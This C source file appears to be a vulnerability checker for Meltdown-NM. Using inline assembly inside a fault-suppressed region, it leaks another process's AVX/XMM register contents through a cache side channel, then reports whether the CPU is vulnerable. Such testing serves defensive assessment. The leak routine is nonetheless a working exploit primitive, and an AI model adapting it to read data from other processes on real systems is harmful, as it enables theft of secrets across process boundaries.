#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libcache/cache.h"
#include "lib/global.h"

int main(int argc, char **argv)
{
    PREPARE();
    // Flush our shared memory
    flush_shared_memory();
    start_time = time(NULL);
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        if (try_start())
        {
            // Encode the data from the AVX register of the other process in the cache
            asm volatile("1:\n"
                         "movq (%%rsi), %%rsi\n"
                         "movq %%xmm0, %%rax\n"
                         "shl $12, %%rax\n"
                         "jz 1b\n"
                         "movq (%%rbx,%%rax,1), %%rbx\n"
                         :
                         : "b"(mem), "S"(0)
                         : "rax");
            try_abort();
        }
        try_end();

        // Recover data from the cache
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_NM: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_NM: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_NM: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}